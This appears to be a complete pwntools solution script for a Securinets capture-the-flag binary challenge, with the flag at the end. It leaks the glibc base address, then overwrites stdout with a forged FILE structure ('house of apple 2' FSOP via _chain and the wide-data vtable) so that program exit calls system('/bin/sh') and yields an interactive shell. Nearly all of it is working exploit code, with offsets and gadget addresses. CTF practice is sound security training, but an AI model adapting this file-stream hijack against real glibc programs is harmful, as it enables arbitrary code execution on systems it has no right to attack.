from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./main_patched', '''
    # b *_IO_wdoallocbuf+28
    continue
''')

# p = remote('pwn-14caf623.p1.securinets.tn', 9002)

glibc_e = ELF('./libc.so.6')

# 1. get glibc base address
p.recvuntil(b"stdout : ")
glibc_base_addr = int(p.recvline().strip(), 16)-glibc_e.symbols['_IO_2_1_stdout_']
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 2. house of apple 2 through _IO_2_1_stdout_->_chain (_IO_2_1_stdout_->vtable cannot be exploited because it is not writable since only 0xd8 bytes at most can be read into _IO_2_1_stdout_)
# exit->__run_exit_handlers->_IO_cleanup->_IO_flush_all->_IO_wfile_overflow->_IO_wdoallocbuf
payload = flat({
    0x10: b'/bin/sh\x00',
    0x18: 0, # stdout->_IO_read_base
    0x20: 1, # stdout->_IO_write_base
    0x40: glibc_base_addr+0x14d0f6, # 0x000000000014d0f6: call qword ptr [rax + 0x10];
    0x48: glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x10,
    0x50: glibc_base_addr+glibc_e.sym.system,
    0x68: glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']-0x8, # stdout->_chain
    0x80: glibc_base_addr+0x1e97a0, # fp->_lock
    0x88: glibc_base_addr+0x1e97a0, # stdout->_lock
    0x98: glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']-0x28, # fp->_wide_data
    0xa8: glibc_base_addr+0x9afe7, # 0x000000000009afe7: mov rdi, qword ptr [rax + 8]; call qword ptr [rax];
    0xb8: glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x40, # fp->_wide_data->_wide_vtable
    0xd0: glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps'], # fp->vtable
}, filler=b'\x00', length=0xd8)
p.send(payload)
# FSOP will be triggered on exit

p.interactive()

# Securinets{who_need_vtable_when_we_have_chain}